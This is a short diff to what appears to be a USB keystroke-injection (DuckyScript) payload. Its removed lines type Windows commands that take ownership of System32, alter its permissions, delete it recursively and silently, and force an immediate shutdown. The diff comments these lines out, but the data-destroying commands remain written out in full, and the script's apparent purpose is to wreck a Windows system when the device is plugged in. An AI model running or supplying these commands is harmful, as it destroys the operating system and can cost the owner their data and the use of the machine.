@@ -8,11 +8,11 @@ DELAY 500
 LEFT
 DELAY 500
 ENTER
-STRING takeown /f C:\Windows\System32
+#STRING takeown /f C:\Windows\System32
 ENTER
-STRING cacls C:\Windows\System32
+#STRING cacls C:\Windows\System32
 ENTER
-STRING rd C:\Windows\System32 /s /q
+#STRING rd C:\Windows\System32 /s /q
 ENTER
-STRING shutdown -t 0 -f
+#STRING shutdown -t 0 -f
 ENTER
